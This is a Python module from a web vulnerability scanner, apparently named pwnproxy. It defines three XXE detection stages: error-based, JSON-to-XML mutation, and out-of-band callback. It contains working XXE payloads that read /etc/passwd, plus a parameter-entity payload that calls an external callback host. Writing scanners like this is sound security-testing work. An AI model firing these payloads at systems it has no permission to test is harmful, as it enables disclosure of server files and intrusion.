"""XXE detection stages for DetectionChain.

Stages
------
- ErrorBasedStage:    order=0, min_depth=fast     — XML parse error differences
- JSONMutateStage:    order=1, min_depth=standard — JSON→XML conversion then detect
- OOBStage:           order=2, min_depth=deep     — external DTD callback
"""

import logging
import re
from typing import Optional

from pwnproxy.plugins.core.base import Finding
from pwnproxy.plugins.core.chain import DetectionDepth, DetectionStage, StageResult
from pwnproxy.shared.models import Flow
from pwnproxy.shared.scan.params import InjectionPoint
from pwnproxy.shared.scan.protocols import XMLMutableReplayer
from pwnproxy.shared.scan.replayer import RequestReplayer
from pwnproxy.shared.canary import get_registry

logger = logging.getLogger(__name__)

# XML error signatures
XML_ERROR_SIGNATURES = [
    "XML parsing error",
    "SimpleXML error",
    "DOMDocument::load",
    "Parser error",
    "xmlParseEntity",
    "StartTag: invalid element name",
    "Extra content at the end of the document",
    "DOCTYPE is not allowed",
    "DTD is prohibited",
    "Entity: line",
    "XMLReader::read()",
    "simplexml_load_string()",
    "could not parse XML",
    "LoadException",
]


class XxeErrorBasedStage(DetectionStage):
    """Detect XXE via XML parse error differences."""

    order = 0
    min_depth = DetectionDepth.FAST
    capability = "xxe-error-based"

    ENTITY_XML = """<?xml version=\"1.0\"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<root>
  <data>&xxe;</data>
</root>"""

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        if not isinstance(replayer, XMLMutableReplayer):
            logger.warning(
                "XxeErrorBasedStage received a non-XML replayer (%s). "
                "XML mutation will not work.",
                type(replayer).__name__,
            )
        self._evasion = evasion_level

    async def execute(
        self,
        flow: Flow,
        injection_points: list[InjectionPoint],
    ) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            resp = await self._replayer.replay(
                point,
                self.ENTITY_XML,
                timeout=5.0,
                evasion_level=self._evasion,
            )
            if resp is None:
                continue

            error_sigs = self._check_error_signatures(resp.text)
            if error_sigs:
                findings.append(Finding(
                    scanner="xxe",
                    url=point.url,
                    method=point.method,
                    param_name=point.name,
                    param_location=point.location,
                    technique="xxe-error-based",
                    severity="medium",
                    confidence="tentative",
                    payload=self.ENTITY_XML,
                    evidence=f"XML error signature: {error_sigs[0][:200]}",
                ))
                confirmed.add(self._point_key(point))

        return StageResult(findings=findings, confirmed_points=confirmed)

    @staticmethod
    def _check_error_signatures(body: str) -> list[str]:
        found = []
        for sig in XML_ERROR_SIGNATURES:
            if sig.lower() in body.lower():
                found.append(sig)
        return found

    @staticmethod
    def _point_key(point: InjectionPoint) -> tuple:
        return (point.method, point.host + point.path, point.name, point.location)


class JSONMutateStage(DetectionStage):
    """Convert JSON endpoints to XML and test for XXE."""

    order = 1
    min_depth = DetectionDepth.STANDARD
    capability = "xxe-json-mutate"

    XML_TEMPLATE = """<?xml version=\"1.0\"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">
]>
<root>
  <data>&xxe;</data>
</root>"""

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(
        self,
        flow: Flow,
        injection_points: list[InjectionPoint],
    ) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            ct = point.original_headers.get("content-type", "").lower()
            if "json" not in ct:
                continue

            resp = await self._replayer.replay(
                point,
                self.XML_TEMPLATE,
                timeout=5.0,
                evasion_level=self._evasion,
            )
            if resp is None:
                continue

            if self._is_xxe_like(resp):
                findings.append(Finding(
                    scanner="xxe",
                    url=point.url,
                    method=point.method,
                    param_name=point.name,
                    param_location=point.location,
                    technique="xxe-json-mutation",
                    severity="medium",
                    confidence="tentative",
                    payload=self.XML_TEMPLATE,
                    evidence=f"JSON endpoint accepted XML with XXE (status={resp.status_code})",
                ))
                confirmed.add(self._point_key(point))

        return StageResult(findings=findings, confirmed_points=confirmed)

    @staticmethod
    def _is_xxe_like(resp) -> bool:
        if resp.status_code in (400, 422, 500):
            body_lower = resp.text.lower()
            for sig in XML_ERROR_SIGNATURES:
                if sig.lower() in body_lower:
                    return True
        if resp.status_code < 300 and "xml" in resp.headers.get("content-type", "").lower():
            return True
        return False

    @staticmethod
    def _point_key(point: InjectionPoint) -> tuple:
        return (point.method, point.host + point.path, point.name, point.location)


class XxeOOBStage(DetectionStage):
    """OOB XXE detection via external DTD callback."""

    order = 2
    min_depth = DetectionDepth.DEEP
    capability = "xxe-oob"

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(
        self,
        flow: Flow,
        injection_points: list[InjectionPoint],
    ) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()
        registry = get_registry()

        for point in injection_points:
            scan_id = f"xxe-oob-{flow.id}-{point.name}"
            canary = registry.create(scan_id)
            callback_url = f"http://oob.pwnproxy/{canary.token}"

            payload = f"""<?xml version=\"1.0\"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM \"{callback_url}\">
  %xxe;
]>
<root>
  <data>test</data>
</root>"""

            resp = await self._replayer.replay(
                point,
                payload,
                timeout=10.0,
                evasion_level=self._evasion,
            )

            import asyncio
            await asyncio.sleep(2)

            hit = registry.get(canary.token)
            if hit and hit.callback_received:
                findings.append(Finding(
                    scanner="xxe",
                    url=point.url,
                    method=point.method,
                    param_name=point.name,
                    param_location=point.location,
                    technique="xxe-oob",
                    severity="critical",
                    confidence="confirmed",
                    payload=payload,
                    evidence=f"OOB callback received from {hit.callback_ip}",
                    extra={"oob_token": canary.token, "callback_ip": hit.callback_ip},
                ))
                confirmed.add(self._point_key(point))

            registry.cleanup_expired()

        return StageResult(findings=findings, confirmed_points=confirmed)

    @staticmethod
    def _point_key(point: InjectionPoint) -> tuple:
        return (point.method, point.host + point.path, point.name, point.location)
